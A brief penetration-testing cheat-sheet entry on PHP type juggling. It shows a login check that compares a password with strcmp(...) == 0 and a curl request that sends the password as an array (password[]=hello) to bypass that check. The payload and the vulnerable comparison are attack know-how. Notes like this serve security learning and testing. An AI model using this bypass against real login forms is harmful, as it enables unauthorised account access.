# Type Juggling

Change the data type in PHP (compare string with array and bypass)

{% code overflow="wrap" fullWidth="true" %}
```bash
# In the PHP code they're usting strcmp for username and/or password hardcoded:
if(strcmp($_POST['password'],$PASSWORD) == 0)

# We can bypass this with arrays (try for user/pass or both) with curl or Repeater:
curl -X POST http://localhost/login.php --data 'username=admin&password[]=hello'

# The field is password=.... // and we use password[]=.... (bad to use a comparison in the code)
```
{% endcode %}
